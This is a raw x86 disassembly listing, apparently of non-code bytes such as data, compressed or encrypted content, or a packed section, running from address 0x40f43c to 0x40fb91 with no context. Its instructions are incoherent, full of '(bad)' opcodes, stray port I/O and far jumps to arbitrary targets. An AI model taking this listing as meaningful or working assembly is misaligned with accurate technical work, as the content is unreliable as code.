  40f43c:	add    BYTE PTR [ebx-0x1c],al
  40f43f:	call   0x7f34:0x68f59e9a
  40f446:	push   ebp
  40f447:	popa   
  40f448:	xchg   ebx,eax
  40f449:	push   ebp
  40f44a:	shl    BYTE PTR [ebx+ebx*1-0x80],cl
  40f44e:	mov    al,0x82
  40f450:	imul   ebp,DWORD PTR [ebx+0x2],0xce069c4e
  40f457:	cmc    
  40f458:	cli    
  40f459:	jb     0x40f3f0
  40f45b:	mov    al,ds:0x4716f12f
  40f460:	dec    esp
  40f461:	imul   esi,ebx,0x1a
  40f464:	mov    edx,0x451249b6
  40f469:	test   DWORD PTR [ebx-0x21a98ef7],eax
  40f46f:	jnp    0x40f4ba
  40f471:	inc    ebx
  40f472:	int3   
  40f473:	imul   edi,DWORD PTR [esi],0x6f
  40f476:	dec    eax
  40f477:	xor    BYTE PTR [edx-0x7f],al
  40f47a:	shl    BYTE PTR [edi],1
  40f47c:	push   esp
  40f47d:	ins    DWORD PTR es:[edi],dx
  40f47e:	push   esi
  40f47f:	mov    ebp,edx
  40f481:	or     ah,BYTE PTR [ebx]
  40f483:	mov    eax,DWORD PTR [edx+0x7d]
  40f486:	imul   edi,esp,0xbcb6cf45
  40f48c:	mov    bl,0xd
  40f48e:	mov    al,0xcb
  40f490:	int3   
  40f491:	and    BYTE PTR [eax-0x66],dh
  40f494:	mov    edi,0x96a3cc8f
  40f499:	and    al,0x9c
  40f49b:	jo     0x40f448
  40f49d:	clc    
  40f49e:	ins    DWORD PTR es:[edi],dx
  40f49f:	and    cl,BYTE PTR [eax+0x4dbc2979]
  40f4a5:	and    DWORD PTR [ebp-0x76],ecx
  40f4a8:	xchg   edi,eax
  40f4a9:	inc    edx
  40f4aa:	jae    0x40f45e
  40f4ac:	push   esp
  40f4ad:	pop    ebp
  40f4ae:	jns    0x40f4ee
  40f4b0:	lods   eax,DWORD PTR ds:[esi]
  40f4b1:	inc    eax
  40f4b2:	cli    
  40f4b3:	jne    0x40f46e
  40f4b5:	out    0xe6,al
  40f4b7:	push   edi
  40f4b8:	add    al,0x70
  40f4ba:	jbe    0x40f46b
  40f4bc:	adc    BYTE PTR [ebp+ebx*2+0x6b631b4e],0x4
  40f4c4:	out    0x55,eax
  40f4c6:	(bad)  
  40f4c8:	add    eax,0x7a1e53d0
  40f4cd:	clc    
  40f4ce:	cmc    
  40f4cf:	pop    edx
  40f4d0:	aam    0x7e
  40f4d2:	or     edx,DWORD PTR [ebx+0x70]
  40f4d5:	cli    
  40f4d6:	test   DWORD PTR [edx-0x10bd55dd],0xa8ecf31d
  40f4e0:	adc    al,0x36
  40f4e2:	ss iret 
  40f4e4:	fsubp  st(2),st
  40f4e6:	push   ecx
  40f4e7:	dec    ecx
  40f4e8:	or     BYTE PTR [ecx-0x6bfb8c19],ah
  40f4ee:	dec    DWORD PTR [ebp-0x2addecc5]
  40f4f4:	retf   0xb591
  40f4f7:	fisub  WORD PTR [edx+0x5f]
  40f4fa:	dec    ebp
  40f4fb:	jg     0x40f4b1
  40f4fd:	outs   dx,DWORD PTR ds:[esi]
  40f4fe:	jnp    0x40f4fc
  40f500:	iret   
  40f501:	mov    BYTE PTR [ebx],dh
  40f503:	outs   dx,DWORD PTR ds:[esi]
  40f504:	ret    
  40f505:	aaa    
  40f506:	xchg   edx,eax
  40f507:	sar    BYTE PTR [edi-0x6cbc3b43],0xa7
  40f50e:	scas   eax,DWORD PTR es:[edi]
  40f50f:	test   BYTE PTR [edx+ebp*8+0x38],al
  40f513:	imul   esp,ecx,0x2d46f3d9
  40f519:	pop    ds
  40f51a:	or     BYTE PTR [edi-0x5a579f22],dl
  40f520:	cmc    
  40f521:	and    al,0x87
  40f523:	jns    0x40f576
  40f525:	inc    edi
  40f526:	push   ebp
  40f527:	ret    0x701b
  40f52a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f52b:	dec    edx
  40f52c:	js     0x40f4ba
  40f52e:	(bad)  
  40f530:	push   esi
  40f531:	jmp    FWORD PTR [ebp+0x71]
  40f534:	dec    ebx
  40f535:	arpl   WORD PTR [ecx+0xc],si
  40f538:	xchg   BYTE PTR ds:0x9c8eeeca,al
  40f53e:	add    dh,BYTE PTR [eax+0x1b506bc9]
  40f544:	loop   0x40f50b
  40f546:	dec    esi
  40f547:	imul   edi,ebx,0xbe4d8b0
  40f54d:	xchg   ebx,eax
  40f54e:	popa   
  40f54f:	repz mov ebp,0x731b50c
  40f555:	data16 mov ch,0x76
  40f558:	ss call 0xac39b82a
  40f55e:	test   al,0xbe
  40f560:	popa   
  40f561:	ror    BYTE PTR [edx+ecx*2-0x1a],cl
  40f565:	sbb    BYTE PTR ds:0x29032cec,cl
  40f56b:	xrelease mov BYTE PTR [edi+0x43e85da3],bh
  40f572:	ret    
  40f573:	outs   dx,DWORD PTR ds:[esi]
  40f574:	push   edi
  40f575:	jo     0x40f57f
  40f577:	mov    dh,0xea
  40f579:	push   ebp
  40f57a:	in     al,dx
  40f57b:	dec    ebx
  40f57c:	xor    eax,0x73ea6f2b
  40f581:	mov    DWORD PTR [ebx-0x22],edi
  40f584:	fs (bad) 
  40f586:	cmp    bh,BYTE PTR [edx]
  40f588:	jo     0x40f539
  40f58a:	in     al,dx
  40f58b:	pop    edi
  40f58c:	push   eax
  40f58e:	pop    ebx
  40f58f:	pop    ebp
  40f590:	pushf  
  40f591:	inc    esp
  40f592:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f593:	mov    ebp,0xf546cb10
  40f598:	aad    0x15
  40f59a:	inc    esp
  40f59b:	jg     0x40f57a
  40f59d:	scas   eax,DWORD PTR es:[edi]
  40f59e:	mov    BYTE PTR [esi+0x6c],dh
  40f5a1:	mov    bh,0xfd
  40f5a3:	(bad)  
  40f5a4:	loopne 0x40f5c2
  40f5a6:	push   ebp
  40f5a7:	ins    BYTE PTR es:[edi],dx
  40f5a8:	push   esp
  40f5a9:	int3   
  40f5aa:	mov    ch,0x73
  40f5ac:	lds    edi,FWORD PTR [edx]
  40f5ae:	mov    eax,ds:0x8ff962dd
  40f5b3:	test   DWORD PTR [esi+ebp*4+0x5d041930],0x75450244
  40f5be:	sub    eax,0x2660b951
  40f5c3:	mov    eax,0x858d2837
  40f5c8:	(bad)  
  40f5c9:	fidivr DWORD PTR [ebx]
  40f5cb:	repz es push eax
  40f5ce:	ds lahf 
  40f5d0:	repnz mov edi,0xa7b3a1dc
  40f5d6:	mov    dh,0x4e
  40f5d8:	jge    0x40f5b8
  40f5da:	jecxz  0x40f5d1
  40f5dc:	scas   al,BYTE PTR es:[edi]
  40f5dd:	int3   
  40f5de:	push   edx
  40f5df:	in     eax,0x5c
  40f5e1:	jmp    0x102b1c9d
  40f5e6:	mov    bh,0xdb
  40f5e8:	pop    esi
  40f5e9:	mov    eax,0x1418cf95
  40f5ee:	xor    esi,edi
  40f5f0:	fcmovnbe st,st(4)
  40f5f2:	mov    al,fs:0xf15cb77d
  40f5f8:	mov    eax,ds:0x1a3ab194
  40f5fd:	mov    bl,0x7
  40f5ff:	xlat   BYTE PTR ds:[ebx]
  40f600:	stc    
  40f601:	js     0x40f5fa
  40f603:	xchg   ebx,eax
  40f604:	call   ebx
  40f606:	mov    ecx,0x1c03236b
  40f60b:	or     eax,0x1d55cd73
  40f610:	mov    al,0x49
  40f612:	pop    edi
  40f613:	or     ebx,DWORD PTR [eax-0x669be593]
  40f619:	ret    
  40f61a:	mov    al,ds:0x7d1d936
  40f61f:	sub    eax,0x1597b296
  40f624:	out    dx,al
  40f625:	jmp    0xf6643399
  40f62a:	pop    eax
  40f62b:	aas    
  40f62c:	and    DWORD PTR [ebx],edx
  40f62e:	shl    BYTE PTR [ecx+0x7085209c],1
  40f634:	ficom  DWORD PTR [ebx+ebx*4]
  40f637:	cmp    BYTE PTR [ecx-0x2e9b0e47],al
  40f63d:	shl    DWORD PTR [ebp+0xef74d24],1
  40f643:	dec    esp
  40f644:	outs   dx,DWORD PTR ds:[esi]
  40f645:	add    BYTE PTR [ebx*1-0x487075d2],bh
  40f64c:	arpl   bp,di
  40f64e:	gs push 0xd
  40f651:	inc    eax
  40f652:	push   0xaa26767a
  40f657:	sub    DWORD PTR [ebp+0x7b8c62ed],0x769f026b
  40f661:	in     al,0x9f
  40f663:	xor    BYTE PTR [edx],dh
  40f665:	pop    eax
  40f666:	pop    edx
  40f667:	jo     0x40f64e
  40f669:	cmp    eax,0xe1a520ad
  40f66e:	retf   0xcc4
  40f671:	shl    cl,1
  40f673:	int    0x67
  40f675:	or     bl,BYTE PTR [edi-0x5d696d4d]
  40f67b:	fdivr  QWORD PTR [ebx-0x37]
  40f67e:	into   
  40f67f:	fmul   QWORD PTR [ebp-0x7e]
  40f682:	test   DWORD PTR [edi+eiz*4+0x77],edi
  40f686:	sub    ecx,DWORD PTR [esp+eax*4+0x1d275817]
  40f68d:	lods   ax,WORD PTR ds:[esi]
  40f68f:	ins    DWORD PTR es:[edi],dx
  40f690:	out    dx,eax
  40f691:	scas   al,BYTE PTR es:[edi]
  40f692:	je     0x40f670
  40f694:	xor    DWORD PTR [edi+0x20],0x6b6226aa
  40f69b:	cwde   
  40f69c:	xchg   BYTE PTR [edx+ecx*4],bh
  40f69f:	ins    DWORD PTR es:[edi],dx
  40f6a0:	push   ecx
  40f6a1:	push   ebx
  40f6a2:	mov    edi,0xe7cd5698
  40f6a7:	pop    eax
  40f6a8:	outs   dx,BYTE PTR ds:[esi]
  40f6a9:	cmc    
  40f6aa:	imul   DWORD PTR [ecx]
  40f6ac:	int    0xdb
  40f6ae:	loope  0x40f664
  40f6b0:	jg     0x40f67a
  40f6b2:	sbb    ebx,ebx
  40f6b4:	(bad)  
  40f6b5:	pop    esp
  40f6b6:	sbb    DWORD PTR [ebx-0x7dec9145],ebp
  40f6bc:	fsubr  QWORD PTR [ecx+0x4f]
  40f6bf:	je     0x40f68d
  40f6c1:	cmp    BYTE PTR [ecx-0x25],bl
  40f6c4:	hlt    
  40f6c5:	imul   esp,DWORD PTR [edx-0x72],0x5dcc1263
  40f6cc:	shl    DWORD PTR [ecx+edi*2+0x3ce56bad],1
  40f6d3:	mov    esi,eax
  40f6d5:	xor    BYTE PTR [ebp+0x67],bl
  40f6d8:	ror    BYTE PTR [eax+0x68],1
  40f6db:	cmc    
  40f6dc:	imul   esi,ecx,0x7a
  40f6df:	pop    esi
  40f6e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f6e1:	cmp    bh,dh
  40f6e3:	mov    ch,0x3b
  40f6e5:	push   ds
  40f6e6:	mov    ebx,0xf97bb55
  40f6eb:	int3   
  40f6ec:	adc    BYTE PTR [esi-0x686bf136],bh
  40f6f2:	mov    esi,0xa9394dcf
  40f6f7:	pop    eax
  40f6f8:	pushf  
  40f6f9:	bound  edi,QWORD PTR [edx]
  40f6fb:	loopne 0x40f759
  40f6fd:	nop
  40f6fe:	sbb    eax,0x1b4bd0a9
  40f703:	arpl   WORD PTR fs:[ecx+0x36],ax
  40f707:	mov    bl,0x10
  40f709:	push   edx
  40f70a:	arpl   WORD PTR [ebp-0x5003fad0],bp
  40f710:	xchg   edx,eax
  40f711:	int    0xb2
  40f713:	mov    eax,ds:0xa88d295a
  40f718:	ins    BYTE PTR es:[edi],dx
  40f719:	fs mov edi,0xd72865e7
  40f71f:	sbb    bh,BYTE PTR cs:[ebp-0x7a]
  40f723:	mov    BYTE PTR [ebp-0x8fdc54f],al
  40f729:	mov    dh,0x4
  40f72b:	and    DWORD PTR [eax+0x20c97d5b],esi
  40f731:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f732:	jecxz  0x40f6db
  40f734:	xor    BYTE PTR [ebp-0x2f],bh
  40f737:	push   eax
  40f738:	(bad)  
  40f739:	aad    0xf0
  40f73b:	add    eax,DWORD PTR [edx-0x57fcad9f]
  40f741:	adc    al,0xd7
  40f743:	mov    gs,eax
  40f745:	out    dx,al
  40f746:	loop   0x40f78a
  40f748:	jo     0x40f743
  40f74a:	enter  0xc35a,0x91
  40f74e:	mov    ecx,0xcffd9736
  40f753:	scas   eax,DWORD PTR es:[edi]
  40f754:	inc    DWORD PTR [ebx-0x30fd2429]
  40f75a:	sub    eax,0xc737a792
  40f75f:	retf   0xab29
  40f762:	jmp    esi
  40f764:	pop    edx
  40f766:	int    0xfb
  40f768:	pop    edi
  40f769:	jo     0x40f710
  40f76b:	push   ebx
  40f76c:	mov    bh,0xeb
  40f76e:	inc    edx
  40f76f:	in     al,dx
  40f770:	adc    esi,DWORD PTR [edx]
  40f772:	sub    al,0xfb
  40f774:	hlt    
  40f775:	nop
  40f776:	call   0xade1:0x10428db2
  40f77d:	mov    gs,edx
  40f77f:	fwait
  40f780:	xor    BYTE PTR [ebp+0x3c4917a5],al
  40f786:	retf   
  40f787:	push   ecx
  40f788:	ror    BYTE PTR [esi+0x1],0x46
  40f78c:	inc    esi
  40f78d:	jae    0x40f763
  40f78f:	inc    esi
  40f790:	bound  ecx,QWORD PTR [eax+ebx*8+0x5dc77f0b]
  40f797:	inc    eax
  40f798:	lea    eax,[eax+0x75]
  40f79b:	(bad)  
  40f79d:	pop    ebp
  40f79e:	xchg   DWORD PTR [ebp-0x51427fa3],ebx
  40f7a4:	retf   
  40f7a5:	lock gs xchg ebp,eax
  40f7a8:	push   ebx
  40f7a9:	push   0x56524469
  40f7ae:	xchg   esp,eax
  40f7af:	pop    ss
  40f7b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f7b1:	lea    ecx,[ecx+0x3d]
  40f7b4:	cli    
  40f7b5:	mov    ch,BYTE PTR [eax+edx*8]
  40f7b8:	pusha  
  40f7b9:	xor    DWORD PTR [edx+0x1b],eax
  40f7bc:	mov    edi,DWORD PTR [ebp-0x58418641]
  40f7c2:	xchg   DWORD PTR [eax+0x62a5bcd5],ecx
  40f7c8:	cmc    
  40f7c9:	xlat   BYTE PTR ds:[ebx]
  40f7ca:	inc    ebx
  40f7cb:	(bad)  
  40f7cc:	(bad)  
  40f7cd:	outs   dx,BYTE PTR ds:[esi]
  40f7ce:	retf   
  40f7cf:	repnz cli 
  40f7d1:	mov    cl,0x81
  40f7d3:	aad    0xa5
  40f7d5:	(bad)  
  40f7d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f7d8:	(bad)
  40f7db:	add    BYTE PTR [esi+0x67],dh
  40f7de:	pop    eax
  40f7df:	push   edi
  40f7e0:	add    BYTE PTR [ebp-0x40],dh
  40f7e3:	out    dx,eax
  40f7e4:	inc    ecx
  40f7e5:	mov    dl,0xc2
  40f7e7:	cmp    DWORD PTR [edi+esi*2-0xb0cbeee],eax
  40f7ee:	push   edx
  40f7ef:	ds pusha 
  40f7f1:	fiadd  WORD PTR [ecx+ecx*4-0x57e1bf6]
  40f7f9:	std    
  40f7fa:	lods   eax,DWORD PTR ds:[esi]
  40f7fb:	adc    eax,0x9b8a8b0a
  40f800:	sar    DWORD PTR [eax+0x1b5e3965],cl
  40f806:	les    ebx,FWORD PTR [ebx+0x7d7aed91]
  40f80c:	inc    ecx
  40f80d:	push   ebx
  40f80e:	cmp    al,0x86
  40f810:	ret    0x2c08
  40f813:	push   ds
  40f814:	push   ebp
  40f815:	test   al,0xb9
  40f817:	das    
  40f818:	jnp    0x40f7f0
  40f81a:	out    0xbf,al
  40f81c:	push   edx
  40f81d:	nop
  40f81e:	sub    dl,BYTE PTR [edi]
  40f820:	or     bl,BYTE PTR [ecx-0x297bcc69]
  40f826:	sub    al,0xbb
  40f828:	std    
  40f829:	sub    edx,DWORD PTR [edx-0x25943cf4]
  40f82f:	ror    BYTE PTR [esi+ebp*1+0x76],0x91
  40f834:	push   es
  40f835:	arpl   dx,di
  40f837:	jge    0x40f87a
  40f839:	jmp    0x23c2:0xfdcfe8bc
  40f840:	js     0x40f824
  40f842:	cdq    
  40f843:	mov    al,0x4c
  40f845:	int3   
  40f846:	addr16 dec ebx
  40f848:	adc    al,0xf
  40f84a:	mov    ah,0x6b
  40f84c:	out    0x9e,eax
  40f84e:	mov    dh,0x6a
  40f850:	or     al,0x95
  40f852:	sub    DWORD PTR [esi+0x578f3e34],eax
  40f858:	in     eax,dx
  40f859:	push   ss
  40f85a:	xchg   ecx,eax
  40f85b:	and    al,0xf9
  40f85d:	clc    
  40f85e:	xor    al,0x55
  40f860:	les    esi,FWORD PTR [eax]
  40f862:	ret    0xf8ec
  40f865:	mov    esi,0xe0ea5f9e
  40f86a:	mov    WORD PTR fs:[ebx+0x162d7b16],es
  40f871:	and    DWORD PTR [ecx],ebp
  40f873:	cwde   
  40f874:	cld    
  40f875:	fistp  DWORD PTR [ebp-0x4eb80f1e]
  40f87b:	mov    ch,0xa5
  40f87d:	inc    edi
  40f87e:	push   edx
  40f87f:	mov    ds:0x5b3e9369,al
  40f884:	cli    
  40f885:	retf   
  40f886:	push   ds
  40f887:	add    esi,edi
  40f889:	sbb    al,0xd1
  40f88b:	(bad)  
  40f88c:	call   0x5f88:0x3dde38c1
  40f893:	pusha  
  40f894:	stos   DWORD PTR es:[edi],eax
  40f895:	mov    ch,0xd1
  40f897:	test   DWORD PTR [ebp-0x7e],ebp
  40f89a:	and    esi,ebp
  40f89c:	mov    ebx,0xc9367771
  40f8a1:	pusha  
  40f8a2:	xchg   esp,eax
  40f8a3:	dec    edx
  40f8a4:	mov    edx,0x312c798f
  40f8a9:	pop    esp
  40f8aa:	push   cs
  40f8ab:	inc    BYTE PTR [ecx+0x149e17bb]
  40f8b1:	inc    edi
  40f8b2:	mov    cl,0xbc
  40f8b4:	and    ebx,DWORD PTR [eax+0x16]
  40f8b7:	pop    esi
  40f8b8:	hlt    
  40f8b9:	test   al,0x33
  40f8bb:	in     eax,dx
  40f8bc:	pop    esi
  40f8bd:	pop    ebx
  40f8be:	dec    edx
  40f8bf:	inc    BYTE PTR [eax+0x1e]
  40f8c2:	xchg   edx,eax
  40f8c3:	lahf   
  40f8c4:	dec    eax
  40f8c5:	inc    ebx
  40f8c6:	stos   DWORD PTR es:[edi],eax
  40f8c7:	or     al,0xe6
  40f8c9:	jno    0x40f8b1
  40f8cb:	mov    al,0xbe
  40f8cd:	scas   eax,DWORD PTR es:[edi]
  40f8ce:	xchg   ebx,eax
  40f8cf:	or     dl,BYTE PTR [ecx+0x2288555f]
  40f8d5:	addr16 daa 
  40f8d7:	ror    BYTE PTR [ecx+0x9],cl
  40f8da:	add    ah,ch
  40f8dc:	push   esp
  40f8dd:	aaa    
  40f8de:	pop    es
  40f8df:	jnp    0x40f86f
  40f8e1:	xlat   BYTE PTR ds:[ebx]
  40f8e2:	push   0x292a6402
  40f8e7:	push   ebx
  40f8e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f8e9:	xchg   ecx,eax
  40f8ea:	mov    eax,ds:0x7d836737
  40f8ef:	outs   dx,DWORD PTR ds:[esi]
  40f8f0:	xchg   ebp,eax
  40f8f1:	push   cs
  40f8f2:	fndisi(8087 only) 
  40f8f4:	push   edx
  40f8f5:	pop    es
  40f8f6:	mov    edx,0xa631b6f3
  40f8fb:	loope  0x40f916
  40f8fd:	pushf  
  40f8fe:	imul   eax,DWORD PTR [eax-0x8],0xe0bae586
  40f905:	inc    eax
  40f906:	int    0xdf
  40f908:	cmp    edi,eax
  40f90a:	or     eax,0x8d469297
  40f90f:	das    
  40f910:	in     eax,dx
  40f911:	retf   
  40f912:	jecxz  0x40f974
  40f914:	fidiv  DWORD PTR [eax-0x25]
  40f917:	out    dx,al
  40f918:	pop    edi
  40f919:	fist   WORD PTR [ebp+edx*1+0x3]
  40f91d:	arpl   WORD PTR [ecx],di
  40f91f:	out    dx,al
  40f920:	and    al,0x36
  40f922:	adc    bl,dl
  40f924:	cs sub al,0x95
  40f927:	out    0x92,al
  40f929:	and    ebp,DWORD PTR [edi+edx*4]
  40f92c:	fstp   DWORD PTR [ecx]
  40f92e:	aam    0x4c
  40f930:	lods   al,BYTE PTR ds:[esi]
  40f931:	enter  0x1202,0x7
  40f935:	mov    eax,0x5c6c7855
  40f93a:	loope  0x40f963
  40f93c:	push   0x3fc446da
  40f941:	mov    gs,WORD PTR [esi-0x7c]
  40f944:	mov    ds:0x841600ef,al
  40f949:	sub    ah,BYTE PTR [eax-0x3f1196ac]
  40f94f:	(bad)  
  40f951:	and    ebx,DWORD PTR [ecx]
  40f953:	popa   
  40f954:	mov    dh,0xaf
  40f956:	xchg   ebp,eax
  40f957:	leave  
  40f958:	das    
  40f959:	jmp    0x672a67df
  40f95e:	cmp    eax,0xbb2c2cd8
  40f963:	adc    BYTE PTR [ebx],bl
  40f965:	(bad)  
  40f967:	ror    BYTE PTR [esi-0x14],cl
  40f96a:	inc    edi
  40f96b:	nop
  40f96c:	mov    ah,0xe
  40f96e:	ror    bl,1
  40f970:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f971:	ds add edi,0xfffffff0
  40f975:	into   
  40f976:	xchg   edx,eax
  40f977:	fcmovnu st,st(2)
  40f979:	nop
  40f97a:	gs xchg esi,eax
  40f97c:	mov    ds:0x9d352e76,al
  40f981:	jmp    0x40f961
  40f983:	pop    edx
  40f984:	sahf   
  40f985:	loope  0x40f9cd
  40f987:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f988:	popa   
  40f989:	mov    esi,0xa50e749e
  40f98e:	lahf   
  40f98f:	cdq    
  40f990:	imul   edx,eax,0x32
  40f993:	dec    eax
  40f994:	push   edx
  40f995:	cwde   
  40f996:	daa    
  40f997:	out    0xe7,eax
  40f999:	cmp    BYTE PTR [esi],dh
  40f99b:	mov    ebx,edx
  40f99d:	or     ah,BYTE PTR [ebp+edx*4+0x3a]
  40f9a1:	cmp    eax,0x49c10e8d
  40f9a6:	dec    edx
  40f9a7:	aam    0xfc
  40f9a9:	loop   0x40f9f3
  40f9ab:	int3   
  40f9ac:	pop    es
  40f9ad:	imul   ecx,DWORD PTR [edx],0x61880f82
  40f9b3:	or     BYTE PTR [ebp+0x48294fc2],0x86
  40f9ba:	test   eax,0xb3f8aa70
  40f9bf:	lahf   
  40f9c0:	lahf   
  40f9c1:	pop    es
  40f9c2:	xchg   BYTE PTR ds:0x6dac44b8,bl
  40f9c8:	push   ebp
  40f9c9:	aaa    
  40f9ca:	ja     0x40fa36
  40f9cc:	popa   
  40f9cd:	int3   
  40f9ce:	rcr    DWORD PTR [eax],1
  40f9d0:	adc    al,0x1b
  40f9d2:	cdq    
  40f9d3:	out    dx,eax
  40f9d4:	mov    ah,0xd8
  40f9d6:	push   ds
  40f9d7:	mov    esp,0x3092978a
  40f9dc:	fabs   
  40f9de:	clc    
  40f9df:	nop
  40f9e0:	xor    al,0xae
  40f9e2:	push   esi
  40f9e3:	mov    esp,0xac0439ef
  40f9e8:	enter  0x6fab,0x99
  40f9ec:	cs adc al,0x61
  40f9ef:	mov    WORD PTR [ebx],gs
  40f9f1:	cs push cs
  40f9f3:	pop    ebx
  40f9f4:	ss retf 0x271
  40f9f8:	adc    eax,esi
  40f9fa:	(bad)  
  40f9fb:	pop    ds
  40f9fc:	and    bl,BYTE PTR [ecx]
  40f9fe:	adc    DWORD PTR [ecx-0x5f],esi
  40fa01:	or     edi,DWORD PTR [esi+eiz*4-0xe]
  40fa05:	xchg   edx,eax
  40fa06:	dec    edi
  40fa07:	fisttp WORD PTR [edx+0x6bdd7ef9]
  40fa0d:	(bad)  
  40fa0e:	mov    dl,0x45
  40fa10:	mov    dl,BYTE PTR [edx]
  40fa12:	push   ebp
  40fa13:	repnz add eax,DWORD PTR ds:0x7f2ffd31
  40fa1a:	mov    bl,0x2c
  40fa1c:	loopne 0x40fa2e
  40fa1e:	rol    ebp,1
  40fa20:	int    0xe6
  40fa22:	xchg   edi,eax
  40fa23:	ret    0x49f0
  40fa26:	xor    cl,BYTE PTR [edi+0x33]
  40fa29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa2a:	js     0x40fa3a
  40fa2c:	mov    esp,0xcbb7cb63
  40fa31:	mov    ebp,0x5e52abf7
  40fa36:	in     al,dx
  40fa37:	sbb    al,0xb3
  40fa39:	adc    eax,0xd3c78b52
  40fa3e:	dec    ebx
  40fa3f:	dec    eax
  40fa40:	nop
  40fa41:	cmp    al,0xfa
  40fa43:	mov    al,ds:0x17d64030
  40fa48:	adc    al,BYTE PTR [ecx]
  40fa4a:	xchg   edx,eax
  40fa4b:	stc    
  40fa4c:	pop    ebp
  40fa4d:	outs   dx,BYTE PTR ds:[esi]
  40fa4e:	jo     0x40f9fa
  40fa50:	dec    ebp
  40fa51:	mov    ds:0xc6418a82,eax
  40fa56:	loope  0x40fa02
  40fa58:	test   eax,0xaab2bb7f
  40fa5d:	cs and eax,0xbf4f34d0
  40fa63:	sbb    esp,DWORD PTR cs:[edi+0x49]
  40fa67:	int    0xd8
  40fa69:	xchg   ecx,eax
  40fa6a:	jecxz  0x40fa2e
  40fa6c:	add    ecx,eax
  40fa6e:	push   eax
  40fa6f:	ss xor bl,cl
  40fa72:	shl    edi,1
  40fa74:	mov    ebp,0x802aaefa
  40fa79:	sbb    DWORD PTR [ebp+0x6d],ecx
  40fa7c:	xchg   esi,eax
  40fa7d:	cs popf 
  40fa7f:	aaa    
  40fa80:	inc    edx
  40fa81:	enter  0x46c0,0x1e
  40fa85:	icebp  
  40fa86:	cmp    BYTE PTR gs:[eax-0x51],bl
  40fa8a:	jo     0x40fa27
  40fa8c:	(bad)  
  40fa8d:	mov    bl,BYTE PTR [esi+0x67a09fcc]
  40fa93:	dec    ebx
  40fa94:	adc    BYTE PTR [edi-0x29],ah
  40fa97:	push   ebp
  40fa98:	call   0x4394298d
  40fa9d:	or     BYTE PTR [esi+0x64e68af6],ch
  40faa3:	loop   0x40fa47
  40faa5:	xchg   ecx,eax
  40faa6:	jg     0x40faed
  40faa8:	push   ss
  40faa9:	outs   dx,BYTE PTR ds:[esi]
  40faaa:	pop    edx
  40faab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40faac:	in     eax,dx
  40faad:	loop   0x40fafc
  40faaf:	jne    0x40fb18
  40fab1:	pop    ecx
  40fab2:	jne    0x40fac6
  40fab4:	jb     0x40fb00
  40fab6:	adc    ebx,DWORD PTR [eax]
  40fab8:	test   eax,0x626602d6
  40fabd:	in     al,0x8
  40fabf:	pusha  
  40fac0:	aaa    
  40fac1:	jmp    0x40fafd
  40fac3:	jge    0x40face
  40fac5:	jne    0x40fa68
  40fac7:	fucom  st(5)
  40fac9:	push   ebx
  40faca:	cmp    eax,0xa7d942ea
  40facf:	adc    ah,BYTE PTR [eax+0xccd39d7]
  40fad5:	adc    al,0x58
  40fad7:	pop    eax
  40fad8:	lea    edx,ds:0x1e04d80c
  40fade:	dec    esi
  40fadf:	xor    BYTE PTR [edi+0x7bee5ad2],dh
  40fae5:	jmp    0x6ff2c6f3
  40faea:	mov    ah,0x6d
  40faec:	cmp    al,0x99
  40faee:	inc    eax
  40faef:	out    dx,al
  40faf0:	and    DWORD PTR cs:[ebx+edx*2+0xe],0xb
  40faf6:	aam    0x52
  40faf8:	cld    
  40faf9:	add    ecx,DWORD PTR [edi-0x5a368b03]
  40faff:	call   0x4f8c:0xb044cd7b
  40fb06:	mov    edi,0xd1330b1e
  40fb0b:	xchg   BYTE PTR [esi+eax*4],ch
  40fb0e:	sub    esp,edx
  40fb10:	jmp    0x63b8:0x623873
  40fb17:	jnp    0x40fab7
  40fb19:	pop    esp
  40fb1a:	and    eax,0x2556f4cd
  40fb1f:	repnz push ecx
  40fb21:	int3   
  40fb22:	aas    
  40fb23:	mov    bh,BYTE PTR [ebx-0x14]
  40fb26:	(bad)  
  40fb27:	out    dx,eax
  40fb28:	sub    dh,BYTE PTR [eax+eiz*1+0x6a]
  40fb2c:	aas    
  40fb2d:	sbb    edx,DWORD PTR [ecx-0x3c]
  40fb30:	in     eax,dx
  40fb31:	sbb    eax,0x5c9c8f61
  40fb36:	std    
  40fb37:	push   cs
  40fb38:	out    dx,al
  40fb39:	stos   DWORD PTR es:[edi],eax
  40fb3a:	cmp    BYTE PTR [esi-0x64],al
  40fb3d:	clc    
  40fb3e:	call   0x3738:0x578cd286
  40fb45:	in     al,dx
  40fb46:	dec    ebp
  40fb47:	data16 mov bh,0xd7
  40fb4a:	in     eax,dx
  40fb4b:	in     eax,0xcf
  40fb4d:	mov    eax,ds:0xa3a3d1cd
  40fb52:	shr    DWORD PTR [edx-0x67768631],cl
  40fb58:	fwait
  40fb59:	sar    BYTE PTR [edx-0x4e],0x76
  40fb5d:	pop    ebx
  40fb5e:	mov    cl,0xa2
  40fb60:	out    dx,eax
  40fb61:	xlat   BYTE PTR ds:[ebx]
  40fb62:	pop    ecx
  40fb63:	push   ecx
  40fb64:	sub    cl,BYTE PTR [esi+0x23]
  40fb67:	push   ds
  40fb68:	or     BYTE PTR [edx],ah
  40fb6a:	stos   DWORD PTR es:[edi],eax
  40fb6b:	xlat   BYTE PTR ds:[ebx]
  40fb6c:	jp     0x40fbdc
  40fb6e:	pop    edx
  40fb70:	loopne 0x40fb0f
  40fb72:	xchg   edx,eax
  40fb73:	sti    
  40fb74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb75:	call   0xbf67c703
  40fb7a:	pop    ecx
  40fb7b:	dec    edi
  40fb7c:	sub    eax,0x8af821c2
  40fb81:	mov    esi,0x16e08e7e
  40fb86:	pop    ebx
  40fb87:	(bad)  
  40fb88:	cs dec ebp
  40fb8a:	cmp    al,0x18
  40fb8c:	mov    dh,0xcb
  40fb8e:	push   esi
  40fb8f:	sbb    ah,ch
  40fb91:	fcomp  QWORD PTR [eax+edx*8+0x38]
